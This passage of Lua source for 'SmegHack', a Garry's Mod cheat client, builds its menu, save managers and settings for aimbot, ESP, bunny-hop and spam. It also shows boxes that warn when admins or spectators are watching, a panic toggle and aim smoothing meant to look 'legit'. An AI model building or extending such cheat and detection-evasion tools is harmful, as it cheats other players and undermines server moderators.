	AddComboBox:SetPos( PosX, PosY )
	AddComboBox:SetSize( SizeX, SizeY )
	AddComboBox:SetValue(SmegHack.Options[Var])
	for k, v in pairs( ChoiceTable ) do
		AddComboBox:AddChoice(v)
	end
	AddComboBox.OnSelect = function(Selected)
		SmegHack.Options[Var] = Selected:GetValue()
		if ExtraFunc != nil then
			ExtraFunc()
		end
	end
end

function AddSlider( Parent, Var, PosX, PosY, Min, Max, Decimals )
	local AddSlider = vgui.Create( "Slider", Parent )
	AddSlider:SetSize( 150, 15 )
	AddSlider:SetPos( PosX, PosY )
	AddSlider:SetMin( Min )
	AddSlider:SetMax( Max )
	AddSlider:SetDecimals( Decimals )
	AddSlider:SetValue( SmegHack.Options[Var] )
	AddSlider.OnValueChanged = function( Panel, Value )
		SmegHack.Options[Var] = math.Round( Value, Decimals )
	end
	AddSlider.Paint = function()
		draw.RoundedBox( 0, 0, 0, 135, 15, Color(255,255,255,255) )
		surface.SetDrawColor(Color(0,0,0,255))
		surface.DrawOutlinedRect( 0, 0, 135, 15 )
		surface.DrawLine( 105, 0, 105, 15 )
	end
end

function AddTextEntry( Parent, Width, PosX, PosY, DefaultText, Var, Save )
	local AddTextEntry = vgui.Create("DTextEntry", Parent)
	AddTextEntry:SetWide(Width)
	AddTextEntry:SetPos(PosX,PosY)
	if Save != nil && SmegHack.TextEntries[Var] != nil then
		AddTextEntry:SetText(SmegHack.TextEntries[Var])
	else
		AddTextEntry:SetText(DefaultText)
	end
	AddTextEntry.OnGetFocus = function()
		if AddTextEntry:GetText() == DefaultText then
			AddTextEntry:SetText("")
		end
	end
	AddTextEntry.OnLoseFocus = function()
		if AddTextEntry:GetText() == "" then
			AddTextEntry:SetText(DefaultText)
			SmegHack.TextEntries[Var] = nil
		else
			SmegHack.TextEntries[Var] = AddTextEntry:GetText()
		end
	end
end

function AddDisplayBox( Title, Mode )
	local DisplayBox = vgui.Create( "DFrame" )
	DisplayBox:SetTitle("")
	DisplayBox:ShowCloseButton(false)
	DisplayBox:SetDraggable(true)
	DisplayBox:SetSize( 150, 50 )
	function DisplayBox:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, 24, Color(0,0,0,255) )
		draw.RoundedBox( 0, 0, 0, w, h, Color(0,10,20,245) )
		draw.SimpleText( Title, "Menu_Title", w/2, 13, Color(0,100,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end

	if Mode == 1 then
		DisplayBox:SetPos( SmegHack.Options["Misc_AdminBox_PosX"], SmegHack.Options["Misc_AdminBox_PosY"] )
		local AdminTable = {"Moo"}
		local Wait = false
		AddHook( "AdminDisplayBox", "Think", RandomString(), function()
			if !SmegHack.Options["Misc_AdminBox"] then
				DisplayBox:Close()
				RemoveHook("AdminDisplayBox")
			end
			local PoX, PoY = DisplayBox:GetPos()
			if  SmegHack.Options["Misc_AdminBox_PosX"] != PoX ||  SmegHack.Options["Misc_AdminBox_PosY"] != PoY then
				SmegHack.Options["Misc_AdminBox_PosX"], SmegHack.Options["Misc_AdminBox_PosY"] = PoX, PoY
			end
			local TempAdminTable = {}
			for k, v in pairs(player.GetAll()) do
				if v:IsAdmin() || v:IsSuperAdmin() then
					table.insert( TempAdminTable, v:Nick() )
				end
			end
			if table.concat(TempAdminTable) != table.concat(AdminTable) then
				if !AdminsListBool && !Wait then
					AdminsListBool = true
					timer.Simple( 0.1, function() AdminsListBool = false Wait = true end )
				elseif Wait then
					AdminTable = table.Copy(TempAdminTable)
					local TextWidth, Tall = 140, 30
					local OldWidth, OldTall = DisplayBox:GetSize()
					if AdminTable[1] != nil then
						for k, v in pairs(AdminTable) do
							local TempTextWidth = AddLabel( DisplayBox, v, 5, Tall, "Admins" )
							if TempTextWidth > TextWidth then TextWidth = TempTextWidth end
							Tall = Tall + 15
						end
						DisplayBox:SetSize( TextWidth + 10, Tall+5 )
					else
						AddLabel( DisplayBox, "No Admins Online", 5, Tall, "Admins" )
						DisplayBox:SetSize( 150, 50 )
					end
					local DifferenceX, DifferenceY = OldWidth - TextWidth+10, OldTall - Tall+5
					local Var = "AdminBox" //This used to be a function but it screwed up, so I just added it to the hook and I couldn't be bothered making it look normal incase you are wondering what the point of this is
					if DifferenceX < 0 then
						DifferenceX = DifferenceX * -1
						RightPos = SmegHack.Options["Misc_"..Var.."_PosX"] - DifferenceX
					else
						RightPos = SmegHack.Options["Misc_"..Var.."_PosX"] + DifferenceX
					end
					if DifferenceY < 0 then
						DifferenceY = DifferenceY * -1
						BottomPos = SmegHack.Options["Misc_"..Var.."_PosY"] - DifferenceY
					else
						BottomPos = SmegHack.Options["Misc_"..Var.."_PosY"] + DifferenceY
					end

					if SmegHack.Options["Misc_"..Var.."_Mode"] == "Auto" then
						local PosX, PosY
						if SmegHack.Options["Misc_"..Var.."_PosX"] > ScrW()/2 then PosX = RightPos else PosX = SmegHack.Options["Misc_"..Var.."_PosX"] end
						if SmegHack.Options["Misc_"..Var.."_PosY"] > ScrH()/2 then PosY = BottomPos else PosY = SmegHack.Options["Misc_"..Var.."_PosY"] end
						DisplayBox:SetPos( PosX, PosY )
					elseif SmegHack.Options["Misc_"..Var.."_Mode"] == "Top Right" then
						DisplayBox:SetPos( RightPos, SmegHack.Options["Misc_"..Var.."_PosY"] )
					elseif SmegHack.Options["Misc_"..Var.."_Mode"] == "Bottom Left" then
						DisplayBox:SetPos( SmegHack.Options["Misc_"..Var.."_PosX"], BottomPos )
					elseif SmegHack.Options["Misc_"..Var.."_Mode"] == "Bottom Right" then
						DisplayBox:SetPos( RightPos, BottomPos )
					end
					Wait = false
				end
			end
		end)
	elseif Mode == 2 then
		DisplayBox:SetPos( SmegHack.Options["Misc_SpectatorsBox_PosX"], SmegHack.Options["Misc_SpectatorsBox_PosY"] )
		local SpecsTable = {"Moo"}
		local Wait = false
		AddHook( "SpecDisplayBox", "Think", RandomString(), function()
			if !SmegHack.Options["Misc_SpectatorsBox"] then
				DisplayBox:Close()
				RemoveHook("SpecDisplayBox")
			end
			local PoX, PoY = DisplayBox:GetPos()
			if  SmegHack.Options["Misc_SpectatorsBox_PosX"] != PoX ||  SmegHack.Options["Misc_SpectatorsBox_PosY"] != PoY then
				SmegHack.Options["Misc_SpectatorsBox_PosX"], SmegHack.Options["Misc_SpectatorsBox_PosY"] = PoX, PoY
			end
			local TempSpecsTable = {}
			for k, v in pairs(player.GetAll()) do
				if v:GetObserverTarget() == LocalPlayer() then
					table.insert( TempSpecsTable, v:Nick() )
				end
			end
			if table.concat(TempSpecsTable) != table.concat(SpecsTable) then
				if !SpecsListBool && !Wait then
					SpecsListBool = true
					timer.Simple( 0.1, function() SpecsListBool = false Wait = true end )
				elseif Wait then
					SpecsTable = table.Copy(TempSpecsTable)
					local TextWidth, Tall = 140, 30
					local OldWidth, OldTall = DisplayBox:GetSize()
					if SpecsTable[1] != nil then
						for k, v in pairs(SpecsTable) do
							local TempTextWidth = AddLabel( DisplayBox, v, 5, Tall, "Spectators" )
							if TempTextWidth > TextWidth then TextWidth = TempTextWidth end
							Tall = Tall + 15
						end
						DisplayBox:SetSize( TextWidth + 10, Tall+5 )
					else
						AddLabel( DisplayBox, "No Spectators", 5, Tall, "Spectators" )
						DisplayBox:SetSize( 150, 50 )
					end
					local DifferenceX, DifferenceY = OldWidth - TextWidth+10, OldTall - Tall+5
					local Var = "SpectatorsBox"
					if DifferenceX < 0 then
						DifferenceX = DifferenceX * -1
						RightPos = SmegHack.Options["Misc_"..Var.."_PosX"] - DifferenceX
					else
						RightPos = SmegHack.Options["Misc_"..Var.."_PosX"] + DifferenceX
					end
					if DifferenceY < 0 then
						DifferenceY = DifferenceY * -1
						BottomPos = SmegHack.Options["Misc_"..Var.."_PosY"] - DifferenceY
					else
						BottomPos = SmegHack.Options["Misc_"..Var.."_PosY"] + DifferenceY
					end

					if SmegHack.Options["Misc_"..Var.."_Mode"] == "Auto" then
						local PosX, PosY
						if SmegHack.Options["Misc_"..Var.."_PosX"] > ScrW()/2 then PosX = RightPos else PosX = SmegHack.Options["Misc_"..Var.."_PosX"] end
						if SmegHack.Options["Misc_"..Var.."_PosY"] > ScrH()/2 then PosY = BottomPos else PosY = SmegHack.Options["Misc_"..Var.."_PosY"] end
						DisplayBox:SetPos( PosX, PosY )
					elseif SmegHack.Options["Misc_"..Var.."_Mode"] == "Top Right" then
						DisplayBox:SetPos( RightPos, SmegHack.Options["Misc_"..Var.."_PosY"] )
					elseif SmegHack.Options["Misc_"..Var.."_Mode"] == "Bottom Left" then
						DisplayBox:SetPos( SmegHack.Options["Misc_"..Var.."_PosX"], BottomPos )
					elseif SmegHack.Options["Misc_"..Var.."_Mode"] == "Bottom Right" then
						DisplayBox:SetPos( RightPos, BottomPos )
					end
					Wait = false
				end
			end
		end)
	end
end

function AddSavePage( Parent, Mode )
	local ManageSaves = vgui.Create("DListView", Parent)
	ManageSaves:SetPos( 25, 55 )
	ManageSaves:SetSize( 550, 200 )
	ManageSaves:SetMultiSelect(false)
	ManageSaves:AddColumn("Title")
	ManageSaves:AddColumn("Date Created")
	function RefreshSaveList(Location, Parent)
		Parent:Clear()
		if !file.Exists( "sh/"..Location, "DATA" ) then file.CreateDir( "sh/"..Location ) end
		if file.Exists( "sh/"..Location, "DATA" ) then
			local Files, Dirs = file.Find( "sh/"..Location.."/*", "DATA" )
			for k, v in pairs( Files ) do
				local Title = string.StripExtension(v)
				local SaveTable = string.Explode( "|", file.Read( "sh/"..Location.."/"..v, "DATA" ) )
				local Date = SaveTable[1]
				local Time = SaveTable[2]
				if Time != nil && Date != nil then
					Parent:AddLine(Title, Date.."|"..Time)
				else
					Parent:AddLine(Title, "This save has been corrupted")
				end
			end
		end
	end
	RefreshSaveList(Mode, ManageSaves)
	
	AddTextEntry( Parent, 275, 25, 275, "Input Save Title", Mode )
	AddGenericButton( Parent, "Refresh Listings", 100, 20, 475, 275, function () RefreshSaveList(Mode, ManageSaves) end )
	AddGenericButton( Parent, "Delete", 51, 20, 419, 275, function()
		if ManageSaves:GetSelectedLine() != nil then
			local SaveTitle = ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(1)
			if file.Exists( "sh/"..Mode.."/"..SaveTitle..".txt", "DATA" ) then file.Delete( "sh/"..Mode.."/"..SaveTitle..".txt" ) end
			RefreshSaveList(Mode, ManageSaves)
		end
	end)
	AddGenericButton( Parent, "Load", 52, 20, 362, 275, function()
		if ManageSaves:GetSelectedLine() != nil then
			local SaveTitle = ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(1)
			if file.Exists( "sh/"..Mode.."/"..SaveTitle..".txt", "DATA" ) then
				local SaveFile = file.Read( "sh/"..Mode.."/"..SaveTitle..".txt" )
				local SaveFileTable = string.Explode( "|", SaveFile )
				for k, v in pairs( SaveFileTable ) do
					if k != 1 && k != 2 then
						if ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(2) != "This save has been corrupted" then
							if Mode == "Friends" then
								table.insert( SmegHack.FriendsList, v )
							elseif Mode == "Configs" then
								if string.Left( v, 1 ) == "{" then
									SmegHack.BoneOrder = util.JSONToTable( v )
								else
									local CommandTable = string.Explode( " ", v )
									if CommandTable[3] == "true" || CommandTable[3] == "false" then
										SmegHack.Options[CommandTable[1]] = tobool(CommandTable[3])
									elseif isnumber(tonumber(CommandTable[3])) then
										SmegHack.Options[CommandTable[1]] = tonumber(CommandTable[3])
									else
										SmegHack.Options[CommandTable[1]] = tostring(CommandTable[3])
									end
								end
							elseif Mode == "Entities" then
								table.insert( SmegHack.EntityESP, v )
							end
						end
					end
				end
				if ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(2) != "This save has been corrupted" then
					if Mode == "Friends" then
						RefreshFriendsList()
					elseif Mode == "Configs" then
						//RefreshSaveList( Mode, ManageSaves )
						CloseMenu()
						ReloadSmegHack(false)
					elseif Mode == "Entities" then
						RefreshEntsList()
					end
				end
			end
		end
	end)
	AddGenericButton( Parent, "Save", 52, 20, 305, 275, function()
		if SmegHack.TextEntries[Mode] != nil then
			local Files, Dirs = file.Find( "sh/"..Mode.."/*", "DATA" )
			for k, v in pairs( Files ) do
				local Title = string.StripExtension(v)
				if Title == SmegHack.TextEntries[Mode] then return end
			end
			if !file.Exists( "sh/"..Mode, "DATA" ) then file.CreateDir( "sh/"..Mode ) end
			if file.Exists( "sh/"..Mode, "DATA" ) then
				if tonumber( os.date("%H"), 10 ) < 12 then
					local SaveText = os.date("%d/%m/%y | %I:%M AM")
					if Mode == "Friends" then
						for k, v in pairs( SmegHack.FriendsList ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "sh/"..Mode.."/"..SmegHack.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Configs" then
						for k, v in pairs( SmegHack.Options ) do
							SaveText = SaveText.."|"..k.." = "..tostring(v)
						end
						SaveText = SaveText.."|"..util.TableToJSON( SmegHack.BoneOrder )
						file.Write( "sh/"..Mode.."/"..SmegHack.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Entities" then
						for k, v in pairs( SmegHack.EntityESP ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "sh/"..Mode.."/"..SmegHack.TextEntries[Mode]..".txt", SaveText)
					end
				else
					local SaveText = os.date("%d/%m/%y | %I:%M PM")
					if Mode == "Friends" then
						for k, v in pairs( SmegHack.FriendsList ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "sh/"..Mode.."/"..SmegHack.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Configs" then
						for k, v in pairs( SmegHack.Options ) do
							SaveText = SaveText.."|"..k.." = "..tostring(v)
						end
						SaveText = SaveText.."|"..util.TableToJSON( SmegHack.BoneOrder )
						file.Write( "sh/"..Mode.."/"..SmegHack.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Entities" then
						for k, v in pairs( SmegHack.EntityESP ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "sh/"..Mode.."/"..SmegHack.TextEntries[Mode]..".txt", SaveText)
					end
				end
			end
			RefreshSaveList(Mode, ManageSaves)
		end
	end)
	AddGenericButton( Parent, "Rename", 52, 20, 305, 300, function()
		if ManageSaves:GetSelectedLine() != nil && SmegHack.TextEntries[Mode] != nil then
			local SaveTitle = ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(1)
			if file.Exists( "sh/"..Mode.."/"..SaveTitle..".txt", "DATA" ) then
				local Files, Dirs = file.Find( "sh/"..Mode.."/*", "DATA" )
				for k, v in pairs( Files ) do
					local Title = string.StripExtension(v)
					if Title == SmegHack.TextEntries[Mode] then return end
				end
				local SaveFileText = file.Read( "sh/"..Mode.."/"..SaveTitle..".txt", "DATA" )
				file.Delete( "sh/"..Mode.."/"..SaveTitle..".txt" )
				file.Write( "sh/"..Mode.."/"..SmegHack.TextEntries[Mode]..".txt", SaveFileText )
				RefreshSaveList(Mode, ManageSaves)
			end
		end
	end)
end

function SmegHackMenu()
	if MenuOpen then
		CloseMenu()
		return
	end
	MenuOpen = true
	//Menu Frame
	local Menu = vgui.Create("DFrame")
	Menu:SetTitle("")
	Menu:ShowCloseButton(false)
	Menu:SetDraggable(true)
	Menu:SetSize(600, 400)
	Menu:Center()
	Menu:MakePopup()
	function Menu:Paint( w, h )
		//Title Bar
		draw.RoundedBox( 0, 0, 0, w, 24, Color(0,0,0,255) )
		draw.RoundedBox( 0, 0, 0, w, h, Color(0,10,20,245) )
		
		draw.SimpleText( "Smeg Hack", "Menu_Title", w/2, 11, Color(0,100,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		draw.SimpleText( "FPS: "..FPSValue, "ESP_Font_Main", 5, 2, Color(0,255,0),TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM )
		draw.SimpleText( "Ping: "..LocalPlayer():Ping(), "ESP_Font_Main", 65, 2, Color(0,255,0), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM )
		
		//Menu Tabs
		draw.RoundedBox( 0, 0, 25, w, 30, Color(128,128,128,255) )
		surface.SetDrawColor( Color(0,0,0) )
		surface.DrawLine( 0, 24, w, 24 )
		surface.DrawLine( 0, 55, w, 55 )
		surface.DrawLine( 0, 24, 0, 55 )
		surface.DrawLine( 50, 24, 50, 55 )
		surface.DrawLine( 100, 24, 100, 55 )
		surface.DrawLine( 150, 24, 150, 55 )
		surface.DrawLine( 200, 24, 200, 55 )
		surface.DrawLine( 250, 24, 250, 55 )
		surface.DrawLine( 300, 24, 300, 55 )
		surface.DrawLine( 350, 24, 350, 55 )
		surface.DrawLine( 400, 24, 400, 55 )
		surface.DrawLine( 450, 24, 450, 55 )
		surface.DrawLine( 500, 24, 500, 55 )
		surface.DrawLine( 550, 24, 550, 55 )
		surface.DrawLine( 599, 24, 599, 55 )
    end
	
	//Tab Frames
	local Main = vgui.Create("DPanel", Menu)
	Main:SetPos( 0 , 25 )
	Main:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Main:SetVisible( false )
	function Main:Paint()
		draw.RoundedBox( 0, 1, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Aimbot = vgui.Create("DPanel", Menu)
	Aimbot:SetPos( 0 , 25 )
	Aimbot:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Aimbot:SetVisible( false )
	function Aimbot:Paint()
		draw.RoundedBox( 0, 51, 0, 49, 30, Color(0,0,255,255) )

		surface.SetDrawColor( Color(255,255,255,255) )

		//Head
		surface.DrawCircle( 490, 75, 30, {255,255,255,255} )

		//Spine
		surface.DrawLine( 490, 105, 490, 255 )

		//Arms
		surface.DrawLine( 490, 180, 440, 130 )
		surface.DrawLine( 490, 180, 540, 130 )
		//Hands
		surface.DrawLine( 440, 130, 420, 130 )
		surface.DrawLine( 540, 130, 560, 130 )

		//Legs
		surface.DrawLine( 490, 255, 440, 305 )
		surface.DrawLine( 490, 255, 540, 305 )
		//Feet
		surface.DrawLine( 440, 305, 400, 305 )
		surface.DrawLine( 540, 305, 580, 305 )
	end
	
	local ESP = vgui.Create("DPanel", Menu)
	ESP:SetPos( 0 , 25 )
	ESP:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	ESP:SetVisible( false )
	function ESP:Paint()
		draw.RoundedBox( 0, 101, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Ents = vgui.Create("DPanel", Menu)
	Ents:SetPos( 0 , 25 )
	Ents:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Ents:SetVisible( false )
	function Ents:Paint()
		draw.RoundedBox( 0, 151, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Misc = vgui.Create("DPanel", Menu)
	Misc:SetPos( 0 , 25 )
	Misc:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Misc:SetVisible( false )
	function Misc:Paint()
		draw.RoundedBox( 0, 201, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Friends = vgui.Create("DPanel", Menu)
	Friends:SetPos( 0 , 25 )
	Friends:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Friends:SetVisible( false )
	function Friends:Paint()
		draw.RoundedBox( 0, 251, 0, 49, 30, Color(0,0,255,255) )
		draw.SimpleText( "Friends                                                       Enemies", "ESP_Font_Main", 300, 43, Color(0,255,0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	
	local Cams = vgui.Create("DPanel", Menu)
	Cams:SetPos( 0 , 25 )
	Cams:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Cams:SetVisible( false )
	function Cams:Paint()
		draw.RoundedBox( 0, 301, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Bhop = vgui.Create("DPanel", Menu)
	Bhop:SetPos( 0 , 25 )
	Bhop:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Bhop:SetVisible( false )
	function Bhop:Paint()
		draw.RoundedBox( 0, 351, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Spam = vgui.Create("DPanel", Menu)
	Spam:SetPos( 0 , 25 )
	Spam:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Spam:SetVisible( false )
	function Spam:Paint()
		draw.RoundedBox( 0, 401, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Test10 = vgui.Create("DPanel", Menu)
	Test10:SetPos( 0 , 25 )
	Test10:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Test10:SetVisible( false )
	function Test10:Paint()
		draw.RoundedBox( 0, 451, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Test11 = vgui.Create("DPanel", Menu)
	Test11:SetPos( 0 , 25 )
	Test11:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Test11:SetVisible( false )
	function Test11:Paint()
		draw.RoundedBox( 0, 501, 0, 49, 30, Color(0,0,255,255) )
	end
	
	local Config = vgui.Create("DPanel", Menu)
	Config:SetPos( 0 , 25 )
	Config:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	Config:SetVisible( false )
	function Config:Paint()
		draw.RoundedBox( 0, 551, 0, 48, 30, Color(0,0,255,255) )
		draw.SimpleText( "Configuration save manager", "ESP_Font_Main", 300, 43, Color(0,255,0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	
	local FriendSaves = vgui.Create("DPanel", Menu)
	FriendSaves:SetPos( 0 , 25 )
	FriendSaves:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	FriendSaves:SetVisible( false )
	function FriendSaves:Paint()
		draw.RoundedBox( 0, 251, 0, 49, 30, Color(0,0,255,255) )
		draw.SimpleText( "Friends list save manager", "ESP_Font_Main", 300, 43, Color(0,255,0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	
	local EntitySaves = vgui.Create("DPanel", Menu)
	EntitySaves:SetPos( 0 , 25 )
	EntitySaves:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	EntitySaves:SetVisible( false )
	function EntitySaves:Paint()
		draw.RoundedBox( 0, 151, 0, 49, 30, Color(0,0,255,255) )
		draw.SimpleText( "Entity ESP save manager", "ESP_Font_Main", 300, 43, Color(0,255,0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end

	local CustomCrosshair = vgui.Create("DPanel", Menu)
	CustomCrosshair:SetPos( 0 , 25 )
	CustomCrosshair:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
	CustomCrosshair:SetVisible( false )
	function CustomCrosshair:Paint()
		draw.RoundedBox( 0, 101, 0, 49, 30, Color(0,0,255,255) )
		draw.SimpleText( "Custom Crosshair", "ESP_Font_Main", 300, 43, Color(0,255,0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	
	//Close Button		
	local CloseButton = vgui.Create("DButton", Menu)
	CloseButton:SetSize(24, 24)
	CloseButton:SetPos(Menu:GetWide()-24, 0)
	CloseButton:SetText("X")
	CloseButton:SetColor(Color(255,255,255))
	function CloseButton:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color(0,30,100,200) )
	end
	CloseButton.DoClick = function() CloseMenu() end
	
	//Panic Button
	local PanicButton = vgui.Create("DButton", Menu)
	PanicButton:SetSize(40, 24)
	PanicButton:SetPos(Menu:GetWide()-64, 0)
	if GetConVarNumber("SmegHack_Panic") == 1 then
		PanicButton:SetText("Enable")
		PanicButton:SetColor(Color(50,200,0,255))
	else
		PanicButton:SetText("Disable")
		PanicButton:SetColor(Color(255,0,0,255))
	end
	function PanicButton:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
	end
	PanicButton.DoClick = function()
		if GetConVarNumber("SmegHack_Panic") == 1 then
			RunConsoleCommand("SmegHack_Panic", 0)
			PanicButton:SetText("Disable")
			PanicButton:SetColor(Color(255,0,0,255))
		else
			RunConsoleCommand("SmegHack_Panic", 1)
			PanicButton:SetText("Enable")
			PanicButton:SetColor(Color(50,200,0,255))
		end
	end
		
	//Menu Tabs
	AddMenuTab( Menu, "Main", Main, 1, 25, 1 )
	AddMenuTab( Menu, "Aimbot", Aimbot, 51, 25, 2 )
	AddMenuTab( Menu, "ESP", ESP, 101, 25, 3 )
	AddMenuTab( Menu, "Ents", Ents, 151, 25, 4 )
	AddMenuTab( Menu, "Misc", Misc, 201, 25, 5 )
	AddMenuTab( Menu, "Friends", Friends, 251, 25, 6 )
	AddMenuTab( Menu, "Cams", Cams, 301, 25, 7 )
	AddMenuTab( Menu, "Bhop", Bhop, 351, 25, 8 )
	AddMenuTab( Menu, "Spam", Spam, 401, 25, 9 )
	AddMenuTab( Menu, "Test10", Test10, 451, 25, 10 )
	AddMenuTab( Menu, "Test11", Test11, 501, 25, 11 )
	AddMenuTab( Menu, "Config", Config, 551, 25, 12 )
	
	function ChangeTab ( Tab, TabID )
		Main:SetVisible(false)
		Aimbot:SetVisible(false)
		ESP:SetVisible(false)
		Ents:SetVisible(false)
		Misc:SetVisible(false)
		Friends:SetVisible(false)
		Cams:SetVisible(false)
		Bhop:SetVisible(false)
		Spam:SetVisible(false)
		Test10:SetVisible(false)
		Test11:SetVisible(false)
		Config:SetVisible(false)
		FriendSaves:SetVisible(false)
		EntitySaves:SetVisible(false)
		CustomCrosshair:SetVisible(false)
		
		Tab:SetVisible(true)
		SmegHack.ActiveTab = TabID
	end
	
	//Main Tab
	AddMainMenuButton( Main, "Unload Hack", 100, 60, function()
		CloseMenu()
		UnloadSmegHack(true)
	end)
	AddMainMenuButton( Main, "Reload Hack", 250, 60, function()
		CloseMenu()
		ReloadSmegHack(true)
	end)
	AddMainMenuButton( Main, "Clear Saved Files", 400, 60, function()
		if file.Exists( "sh", "DATA" ) then
			local Files, Dirs = file.Find( "sh/*", "DATA" )
			for k, v in pairs( Files ) do
				file.Delete( "sh/"..v )
			end
			for k, v in pairs( Dirs ) do
				local Files, Dirs = file.Find( "sh/"..v.."/*", "DATA" )
				local Dir = v
				for k, v in pairs( Files ) do
					file.Delete( "sh/"..Dir.."/"..v )
				end
			end
		end
	end)
	
	//Aimbot Tab
	AddCheckBox( Aimbot, "Aimbot", 15, 45, "Enables/Disables Aimbot", "Aimbot_Toggle" )
	AddCheckBox( Aimbot, "LOS Check", 15, 65, "Only aims at visible players (players within your line of sight)", "Aimbot_LOSCheck" )
	AddCheckBox( Aimbot, "Auto Wall", 15, 85, "Aim at people behind walls that can be shot through", "Aimbot_AutoWall")
	AddCheckBox( Aimbot, "Auto Shoot", 100, 85, "Automatically shoot when the aimbot is locked onto someone", "Aimbot_AutoShoot")

	AddCheckBox( Aimbot, "Aim On Key", 15, 105, "Aimbot only active when selected key is held down", "Aimbot_AimOnKey" )
	AddKeyBind( Aimbot, 100, 105, "Aimbot_AimOnKey_Key" )
	AddLabel( Aimbot, "Aim Priority:", 40, 125 )
	AddComboBox( Aimbot, 100, 125, 100, 15, "Aimbot_AimPriority", {"Distance", "Crosshair"} )
	AddCheckBox( Aimbot, "Smooth Aim", 15, 145, "Aims at other players slowly (looks more legit)", "Aimbot_SmoothAim")
	AddSlider( Aimbot, "Aimbot_SmoothAim_Value", 100, 145, 0, 1000, 0 )
	AddCheckBox( Aimbot, "FOV", 15, 165, "Only aim at players within the selected field of view", "Aimbot_FOV")
	AddSlider( Aimbot, "Aimbot_FOV_Value", 100, 165, 0, 360, 0 )
	AddCheckBox( Aimbot, "Stick To Target", 15, 185, "Will stay aiming at the one target as long as they fall within the selected criteria above", "Aimbot_StickToTarget" )
	AddCheckBox( Aimbot, "Bone Aim", 15, 205, "Aims only at selected bone", "Aimbot_BoneAim" )

	AddCheckBox( Aimbot, "Team", 15, 245, "Aim at/ignore players on your team", "Aimbot_AimTeam" )
	AddCheckBox( Aimbot, "Opponents", 15, 265, "Aim at/ignore players on the other team", "Aimbot_AimOpponents" )
	AddCheckBox( Aimbot, "Friends", 15, 285, "Aim at/ignore players on your friends list", "Aimbot_AimFriends" )
	AddCheckBox( Aimbot, "Enemies", 15, 305, "Aim at/ignore players on your enemies list", "Aimbot_AimEnemies" )
	AddCheckBox( Aimbot, "NPCs", 15, 325, "Aim at/ignore NPCs", "Aimbot_AimNPCs" )
	AddCheckBox( Aimbot, "Spectators", 15, 345, "Aim at/ignore players who are in spectator mode", "Aimbot_AimSpectators" )

	AddComboBox( Aimbot, 100, 245, 70, 15, "Aimbot_AimTeamV", {"Aim", "Ignore"} )
	AddComboBox( Aimbot, 100, 265, 70, 15, "Aimbot_AimOpponentsV", {"Aim", "Ignore"} )
	AddComboBox( Aimbot, 100, 285, 70, 15, "Aimbot_AimFriendsV", {"Aim", "Ignore"} )
	AddComboBox( Aimbot, 100, 305, 70, 15, "Aimbot_AimEnemiesV", {"Aim", "Ignore"} )
	AddComboBox( Aimbot, 100, 325, 70, 15, "Aimbot_AimNPCsV", {"Aim", "Ignore"} )
	AddComboBox( Aimbot, 100, 345, 70, 15, "Aimbot_AimSpectatorsV", {"Aim", "Ignore"} )

	//AddLabel( Parent, Text, PosX, PosY, CloseOn )
	AddLabel( Aimbot, "Offset X:", 200, 325 )
	AddLabel( Aimbot, "Offset Y:", 200, 345 )
	AddSlider( Aimbot, "Aimbot_OffsetX", 250, 320, -100, 100, 0 )
	AddSlider( Aimbot, "Aimbot_OffsetY", 250, 340, -100, 100, 0 )
	
	AddBoneButton( Aimbot, 490, 75, "ValveBiped.Bip01_Head1" )
	AddBoneButton( Aimbot, 490, 120, "ValveBiped.Bip01_Neck1" )
	AddBoneButton( Aimbot, 490, 150, "ValveBiped.Bip01_Spine4" )
	AddBoneButton( Aimbot, 490, 175, "ValveBiped.Bip01_Spine2" )
	AddBoneButton( Aimbot, 490, 200, "ValveBiped.Bip01_Spine1" )
	AddBoneButton( Aimbot, 490, 225, "ValveBiped.Bip01_Spine" )
